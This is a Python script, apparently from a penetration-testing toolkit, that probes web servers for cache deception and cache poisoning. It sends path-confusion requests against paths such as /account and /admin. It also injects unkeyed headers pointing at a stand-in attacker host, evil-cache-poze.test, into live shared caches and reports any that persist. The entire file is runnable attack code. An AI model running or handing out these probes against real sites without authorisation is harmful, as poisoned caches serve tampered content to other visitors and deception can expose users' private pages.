#!/usr/bin/env python
"""cache_probe.py — web-cache deception + poisoning (stdlib only).

Two modes:
  --deception  path-confusion probes (/sensitive;.css , /sensitive/x.css , /sensitive%00.css) —
               if the cache stores an authenticated response keyed on the extension/path-normalization
               mismatch, an anon attacker later fetches the cached private copy. The TOOL sends the
               path-confusion request anon and flags a NON-404 / non-baseline response (a LEAD — full
               proof needs an authed victim to populate the cache first, via auth-tester).
  --poison     unkeyed-input detection: for each candidate header (X-Forwarded-Host, X-Original-URL,
               X-Forwarded-Scheme, X-Forwarded-Proto), send the POISONED header, then immediately
               fetch the SAME cache key WITHOUT it — if the poisoned content comes back, the input is
               UNKEYED = poisonable (the two-step is the decisive test; CWE-444/CWE-525).

Usage: python cache_probe.py <url> [--deception] [--poison] [--marker <attacker-string>]
"""
import sys, json, ssl, re, argparse, urllib.request, urllib.error

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
_CTX = ssl.create_default_context(); _CTX.check_hostname = False; _CTX.verify_mode = ssl.CERT_NONE
CONFUSION = ["{p};.css", "{p}/x.css", "{p}%00.css", "{p};.png", "{p}/a/b.css"]
UNKEYED_HEADERS = ["X-Forwarded-Host", "X-Original-URL", "X-Forwarded-Scheme", "X-Forwarded-Proto", "X-Rewrite-URL"]

def _req(url, headers=None, verify=True):
    h = {"User-Agent": UA, "Accept": "text/html,application/json;q=0.9"}; h.update(headers or {})
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=h), timeout=15, context=(_CTX if not verify else None))
        return r.status, dict(r.headers), r.read(3000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), e.read(3000).decode("utf-8", "replace")
    except Exception as e:
        return None, {}, str(e)

def deception(base, marker, verify):
    # baseline: a known-nonexistent random path (the cache/SPA shell)
    s0, _, b0 = _req(base.rstrip("/") + "/__nonexistent_cache_baseline__", verify=verify)
    findings = []
    for p in ["/", "/account", "/profile", "/dashboard", "/admin", "/api/user", "/wp-admin/"]:
        for tpl in CONFUSION:
            url = base.rstrip("/") + tpl.format(p=p)
            s, h, b = _req(url, verify=verify)
            if s in (None, 404):
                continue
            # differs from the nonexistent baseline AND looks like real content (not a generic 200 shell)
            cc = h.get("cache-control", "") + h.get("age", "")
            if b0 and (b[:120] == b0[:120]):
                continue
            findings.append({"id": "cache-deception-lead", "severity": "medium",
                             "detail": f"path-confusion {url} returned HTTP {s} (not 404, differs from baseline) — if an authenticated response caches here keyed on the extension, an anon can read it. PROOF needs an authed victim to populate the cache (CWE-525). cache-hint:{cc[:40]}",
                             "path": url, "status": s})
    return findings

def poison(base, marker, verify):
    findings = []
    for hdr in UNKEYED_HEADERS:
        # poison: send the header carrying the marker
        poison_val = ("https://evil-cache-poze.test" if "Host" in hdr or "Scheme" in hdr or "Proto" in hdr else "/poisoned/" + marker)
        s1, h1, b1 = _req(base, headers={hdr: poison_val}, verify=verify)
        # re-fetch WITHOUT the header — if the marker/poison returns, the input is unkeyed
        s2, h2, b2 = _req(base, verify=verify)
        if marker in (b2 or "") or "evil-cache-poze" in (b2 or "") or "evil-cache-poze" in (h2.get("location", "") if h2 else ""):
            findings.append({"id": "cache-poisoning-unkeyed-input", "severity": "high",
                             "detail": f"header {hdr} is UNKEYED — a poisoned value persisted into a later user's cached response (CWE-444/525). An attacker bakes malicious content into a shared cached response.",
                             "header": hdr, "status_after_clean_fetch": s2})
    return findings

def run(base, do_deception, do_poison, marker, verify):
    out = {"target": base, "ok": True, "findings": []}
    if do_deception:
        out["deception"] = deception(base, marker, verify); out["findings"] += out["deception"]
    if do_poison:
        out["poison"] = poison(base, marker, verify); out["findings"] += out["poison"]
    if not (do_deception or do_poison):
        out["deception"] = deception(base, marker, verify); out["poison"] = poison(base, marker, verify); out["findings"] = out["deception"] + out["poison"]
    out["note"] = "deception=LEAD until an authed victim populates the cache; poisoning=the two-step (poison then clean-fetch) is decisive. urllib-blind through a JS-challenge WAF (re-test via browser)."
    return out

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Web-cache deception + poisoning")
    ap.add_argument("url"); ap.add_argument("--deception", action="store_true"); ap.add_argument("--poison", action="store_true")
    ap.add_argument("--marker", default="xzcachePoze"); ap.add_argument("--insecure", action="store_true")
    a = ap.parse_args()
    print(json.dumps(run(a.url, a.deception, a.poison, a.marker, not a.insecure), indent=2))
